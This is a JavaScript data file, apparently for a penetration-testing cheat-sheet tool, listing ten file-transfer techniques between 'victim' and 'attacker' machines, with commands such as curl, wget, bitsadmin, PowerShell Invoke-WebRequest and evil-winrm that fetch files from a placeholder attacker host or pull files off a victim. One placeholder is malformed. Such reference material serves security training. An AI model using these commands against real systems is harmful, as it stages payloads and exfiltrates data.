/*
Data structure example:
Each technique contains:
- id: A unique identifier for the technique.
- name: A descriptive name for the technique (e.g., "FTP Transfer").
- platforms: An array of strings indicating the platforms where the technique can be applied (e.g., ["Windows"]).
- fileTo: A string indicating the target machine for the file transfer (e.g., "victim").
- commands: An array of command objects, each containing:
  - machine: A string indicating the machine where the command will be executed (e.g., "victim" or "attacker").
  - command: A string representing the command to be executed, with placeholders for dynamic values (e.g., {attacker_ip}, {attacker_port}, {filename}).
*/


const techniques = [
    {
      id: 1,
      fileTo: "victim",
      name: "FTP Transfer",
      platforms: ["Windows"],
      commands: [
        { machine: "victim", command: "ftp {attacker_ip} {attacker_port}" },
        { machine: "attacker", command: "put {filename}" }
      ]
    },
    {
      id: 2,
      fileTo:"victim", 
      name: "Download with curl",
      platforms: ["Linux"],
      commands: [
        { machine: "victim", command: "curl ftp://{attacker_ip}:{attacker_port}/{filename} -o {filename}" }
      ]
    },
    {
      id: 3,
      fileTo: "attacker",
      name: "Use wget via HTTP (target is running a webserver)",
      platforms: ["Linux"],
      commands: [
        { machine: "attacker", command: "wget http://{victim_ip}:{victim_port}/{filename}" }
      ]
    },
    {
      id: 4,
      fileTo: "victim", 
      name: "PowerShell File Transfer 1",
      platforms: ["Windows"],
      commands: [
        { machine: "victim", command: "Invoke-WebRequest -Uri http://{attacker_ip}:{attacker_port}/{filename} -OutFile {filename}" }
      ]
    },
    {
      id: 5,
      fileTo: "attacker",
      name: "SCP over SSH",
      platforms: ["Linux","MacOS"],
      commands: [
        { machine: "attacker", command: "scp {filename} user@{victim_ip}:/tmp/" }
      ]
    },
    {
      id: 6,
      fileTo: "attacker", 
      name: "Use wget via HTTP (Python web server)",
      platforms: ["Linux"],
      commands: [
        { machine: "victim", command: "python3 -m http.server {victim_port}" },
        { machine: "attacker", command: "wget http://{victim_ip}:{victim_port}/{filename}" }
      ]
    },
    {
      id: 7,
      fileTo: "attacker", 
      name: "evil-winrm",
      platforms: ["Windows"],
      commands: [
        { machine: "victim", command: "download {filename} {/home/kali/{filename}" }
      ]
    },
    {
      id: 8,
      fileTo: "victim", 
      name: "evil-winrm",
      platforms: ["Windows"],
      commands: [
        { machine: "victim", command: "upload {filename}" }
      ]
    },
    {
      id: 9,
      fileTo: "victim", 
      name: "bitsadmin",
      platforms: ["Windows"],
      commands: [
        { machine: "victim", command: "bitsadmin /Transfer myJob http://{attacker_ip}:{attacker_port}/{filename} {filename}" }
      ]
    },
    {
      id: 10,
      fileTo: "victim", 
      name: "PowerShell File Transfer 2",
      platforms: ["Windows"],
      commands: [
        { machine: "victim", command: "IWR http://{attacker_ip}:{attacker_port}/{filename} -OutFile {filename}" }
      ]
    }
  ];
  
  const platformOrder = ["Windows", "Linux", "MacOS"];
  
